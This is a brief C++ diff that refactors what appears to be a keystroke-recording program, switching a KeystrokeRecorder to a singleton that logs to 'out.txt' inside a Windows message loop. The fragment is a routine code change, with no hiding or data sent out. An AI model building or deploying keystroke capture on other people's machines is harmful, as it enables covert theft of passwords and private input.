@@ -8,8 +8,8 @@ int main()
 {
     auto snapshotStream = std::make_shared<SnapshotStream>("out.txt");
 
-    KeystrokeRecorder keystrokeRecorder;
-    keystrokeRecorder.registerRecorder(snapshotStream);
+    KeystrokeRecorder *keystrokeRecorder = KeystrokeRecorder::getInstance();
+    keystrokeRecorder->registerRecorder(snapshotStream);
 
     BOOL ret;
     MSG msg;
